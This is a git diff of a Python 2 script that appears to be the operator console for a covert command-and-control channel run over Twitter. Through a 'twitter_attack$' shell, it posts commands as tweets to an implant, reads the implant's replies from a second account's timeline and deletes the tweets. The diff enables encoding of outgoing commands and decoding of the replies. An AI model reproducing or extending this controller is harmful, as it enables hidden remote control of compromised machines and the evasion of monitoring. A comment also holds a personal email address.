@@ -1,6 +1,6 @@
 import tweepy
-#from newEncrypt import *
-#import os 
+from newEncrypt import *
+import os 
 from time import sleep
 
 #lbwbchigh@yahoo.com
@@ -30,7 +30,7 @@ def limit():
 	remain= almost[:2]
 	print str(remain) + " API calls remaining" 
 	if( int(remain) == 0):
-		print "Sleeping for 15 minutes. Maually delete tweets from Twitter page."
+		print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
 		sleep(15*61)	
 		
 		
@@ -39,10 +39,11 @@ if __name__ == "__main__":
 	while True:
 		var = raw_input("twitter_attack$ ")
 		if var == "exit":
+			print "You have closed the attack shell."
 			break
 		else: 
-			#msg = encode(var) 
-			api.update_status(var)
+			msg = encode(var) 
+			api.update_status(msg)
 			#get and print implant response, might need timing feature
 			sleep(5)
 			new_public_tweets = apiTwo.home_timeline()
@@ -52,10 +53,10 @@ if __name__ == "__main__":
 				#print 'hello' 
 				#print tweet.text
 				test = str(tweet.text)
-				#bytes = str.encode(test)
-				#type(bytes)	
-				#mess = decode(bytes)
-				print test
+				bytes = str.encode(test)
+				type(bytes)	
+				mess = decode(bytes)
+				print mess
 				apiTwo.destroy_status(tweet.id)
 				break
 				#api.destroy_status(tweet.id)
